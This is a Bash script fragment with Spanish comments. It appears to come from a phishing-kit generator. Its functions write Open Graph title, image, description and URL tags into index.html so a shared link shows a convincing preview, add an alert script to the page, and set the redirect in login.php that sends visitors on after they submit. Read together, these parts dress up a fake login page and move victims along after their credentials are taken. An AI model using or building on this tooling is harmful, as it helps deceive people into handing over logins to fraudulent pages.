#Añade un meta title al index.html para mostrar un titulo al enviar un mensaje con el link generado
show_title(){
        ogtitle="<meta property='og:title' content='$title'/>"
        sed -i "/<meta property='og:title' content='.*'/d" ./index.html
        sed -i '4i '"$ogtitle"'' index.html
}

#Añade un meta image al index.html para mostrar una imagen al enviar un mensaje con el link generado
show_photo(){
        if [[ -d images ]];then
                rm -rf images
        fi

        mkdir images
        cp "$ruta" images
        obtener_name=$(basename "$ruta")
        total="$envialink/images/$obtener_name"
        ogimg="<meta property='og:image' content='$total'/>"
        sed -i "/<meta property='og:image' content='.*'/d" ./index.html
        sed -i '4i '"$ogimg"'' index.html
}

#Añade un meta description al index.html para mostrar una breve descripción al enviar un mensaje con el link generado
show_text(){
        ogtext="<meta property='og:description' content='$text' />"
        sed -i "/<meta property='og:description' content='.*'/d" ./index.html
        sed -i '4i '"$ogtext"'' index.html
}

#Añade un meta url al index.html para mostrar una mini url al enviar un mensaje con el link generado
show_url(){
        ogurl="<meta property='og:url' content='http://$url2' />"
        sed -i "/<meta property='og:url' content='.*'/d" ./index.html
        sed -i '4i '"$ogurl"'' index.html
}

#Añade un mensaje de alerta que se mostrara al entrar a la pagina
add_alert_box(){
        ogalert="<script src='alert.js'/>"
        sed -i "/<script src='alert.js'/d" ./index.html

        if [[ -f alert.js ]];then
        rm alert.js
        fi

        echo "alert('$alert');" >> alert.js
        sed -i '4i '"$ogalert"'' index.html
}

change_page(){
    ogrede=" header('Location: $rede');"
    sed -i "/header('Location:.*)/d" ./login.php
    sed -i '2i '"$ogrede"'' login.php
}